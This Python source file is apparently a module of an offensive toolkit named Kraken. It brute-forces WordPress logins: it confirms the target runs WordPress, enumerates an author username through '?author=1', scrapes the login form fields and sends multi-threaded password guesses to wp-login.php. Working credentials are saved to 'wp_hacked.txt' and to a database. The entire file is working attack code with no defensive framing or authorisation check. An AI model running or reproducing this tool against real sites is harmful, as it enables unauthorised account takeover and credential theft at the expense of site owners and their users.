import os
import sys
import re
import requests
from typing import List, Optional, Any, Tuple
from colorama import Fore, Style
import gevent
from gevent.pool import Pool
from gevent import monkey

monkey.patch_all()

from core.module import KrakenModule
from core.ui import success, error, info, status
from core.logger import setup_logger

logger = setup_logger(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'Logs', 'wp_brute.log'))

class WordPressBruteForce(KrakenModule):
    def __init__(self):
        super().__init__(name="WP-Brute")
        self.result_file_path = os.path.join(self.results_dir, 'wp_hacked.txt')

    def check_target(self, target: str, port: Optional[int] = None) -> bool:
        status(f"Validating if {target} is a WordPress site...")
        try:
            r = requests.get(target, timeout=10)
            if 'wp-content' in r.text or '/wp-login.php' in r.text:
                success(f"{target} is confirmed as a WordPress site.")
                return True
            else:
                error(f"{target} is not a WordPress site.")
                logger.error(f"{target} is not a WordPress site.")
                return False
        except Exception as e:
            error(f"Error during validation: {str(e)}")
            logger.error(f"Validation error: {str(e)}")
            return False

    def enumerate_username(self, site: str) -> Optional[str]:
        status(f"Attempting to enumerate username from {site}...")
        try:
            r = requests.get(f'{site}/?author=1', timeout=10)
            if '/author/' in r.text:
                username = re.search(r'/author/(.*)/"', r.text).group(1)
                if '/feed' in username:
                    username = re.search(r'/author/(.*)/feed/"', r.text).group(1)
                success(f"Username found via enumeration: {username}")
                
                with open(os.path.join(self.results_dir, 'found_username.txt'), 'w') as user_file:
                    user_file.write(f"Found username: {username}\n")
                    
                return username
            status(Fore.YELLOW + "Username enumeration failed.")
            return None
        except Exception as e:
            logger.error(f"Enumeration error: {str(e)}")
            return None

    def fetch_wp_values(self, site: str) -> Tuple[str, str]:
        status(f"Fetching WordPress form values from {site}...")
        try:
            agent = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(site + '/wp-login.php', timeout=5, headers=agent)
            wp_submit_match = re.search(r'class="button button-primary button-large" value="(.*)"', r.text)
            wp_submit_value = wp_submit_match.group(1) if wp_submit_match else 'Log In'
            wp_redirect_match = re.search(r'name="redirect_to" value="(.*)"', r.text)
            wp_redirect_to = wp_redirect_match.group(1) if wp_redirect_match else f'{site}/wp-admin/'
            success("Form values fetched successfully.")
            return wp_submit_value, wp_redirect_to
        except Exception as e:
            error(f"Error fetching form values: {str(e)}")
            logger.error(f"Fetch error: {str(e)}")
            sys.exit(1)

    def attempt_login(self, site: str, username: str, password: str, wp_submit_value: str, wp_redirect_to: str, progress: Any, task_id: Any) -> bool:
        agent = {'User-Agent': 'Mozilla/5.0'}
        post_data = {
            'log': username,
            'pwd': password,
            'wp-submit': wp_submit_value,
            'redirect_to': wp_redirect_to,
            'testcookie': 1
        }

        try:
            response = requests.post(site + '/wp-login.php', data=post_data, headers=agent, timeout=10)
            
            if 'wordpress_logged_in_' in str(response.cookies):
                success_msg = f"{username}:{password}"
                progress.console.print(f"\n[bold green][+] SUCCESS: Valid credentials found! {success_msg}[/bold green]")
                
                with open(self.result_file_path, 'a') as writer:
                    writer.write(f"{site}/wp-login.php -> {success_msg}\n")
                
                try:
                    sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
                    from api.save_hit import save_to_db
                    save_to_db("WordPress", site, username, password)
                except Exception as e:
                    logger.debug(f"DB Save ignored: {e}")
                    
                return True
            return False
        except Exception as e:
            logger.error(f"Login attempt error: {str(e)}")
            return False
        finally:
            progress.update(task_id, advance=1, current_attempt=f"{username}:{password}")


    def execute_brute(self, site: str, usernames: List[str], passwords: List[str], wp_submit_value: str, wp_redirect_to: str, threads: int) -> None:
        total_attempts = len(usernames) * len(passwords)
        pool = Pool(threads)

        with self.create_progress_bar() as progress:
            task_id = progress.add_task("[cyan]Brute Forcing...", total=total_attempts, current_attempt="Initializing...")

            def handle_result(username: str, password: str) -> None:
                self.attempt_login(site, username, password, wp_submit_value, wp_redirect_to, progress, task_id)

            try:
                for username in usernames:
                    for password in passwords:
                        pool.spawn(handle_result, username, password)
                pool.join()
            except KeyboardInterrupt:
                progress.stop()
                progress.console.print("[bold yellow]\n[!] Script interrupted by user. Shutting down threads...[/bold yellow]")
                os._exit(0)

        logger.info("Brute force process completed.")

    def run(self, target: str, users_file: Optional[str], username: Optional[str], passwords_file: str, threads: int) -> None:
        self.setup_ui()

        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target

        if not self.check_target(target):
            sys.exit(1)

        usernames = []
        if not username:
            username = self.enumerate_username(target)
            if not username:
                if users_file:
                    usernames = self._get_wordlist(users_file, "users.txt", "path to username list", is_user=True)
                else:
                    error("No username or user list provided, and enumeration failed.")
                    sys.exit(1)
            else:
                usernames = [username]
        else:
            usernames = [username]

        passwords = self._get_wordlist(passwords_file, "passwords.txt", "path to password list")
        wp_submit_value, wp_redirect_to = self.fetch_wp_values(target)
        self.execute_brute(target, usernames, passwords, wp_submit_value, wp_redirect_to, threads)

    def run_interactive(self) -> None:
        self.setup_ui()
        print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
        
        site = input(Fore.WHITE + '[i] Enter the target URL: ').strip()
        if not site.startswith(('http://', 'https://')):
            site = 'http://' + site

        status("Processing site input...")
        if not self.check_target(site):
            sys.exit(1)

        username = self.enumerate_username(site)
        usernames = []
        if not username:
            use_list = input(Fore.WHITE + "[i] Use username list? (Y/n): " + Fore.RESET).strip().lower() != 'n'
            if use_list:
                usernames = self._get_wordlist(None, "users.txt", "Enter path to username list", is_user=True)
            else:
                username = input(Fore.WHITE + "[i] Enter username : " + Fore.RESET).strip()
                if not username:
                    error("No username provided.")
                    sys.exit(1)
                usernames = [username]
                success(f"Username entered manually: {username}")
        else:
            usernames = [username]

        pwds = self._get_wordlist(None, "passwords.txt", "Enter path to password list")
        threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10): ") or 10)

        status("All inputs received successfully.")
        print(Fore.YELLOW + "-"*60)
        print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
        
        wp_submit_value, wp_redirect_to = self.fetch_wp_values(site)
        self.execute_brute(site, usernames, pwds, wp_submit_value, wp_redirect_to, threads)

# Preserve compatibility if external scripts import/call this directly.
_module = WordPressBruteForce()

def run(*args, **kwargs):
    _module.run(*args, **kwargs)

def run_interactive():
    _module.run_interactive()

if __name__ == '__main__':
    try:
        run_interactive()
    except KeyboardInterrupt:
        logger.info("Script interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
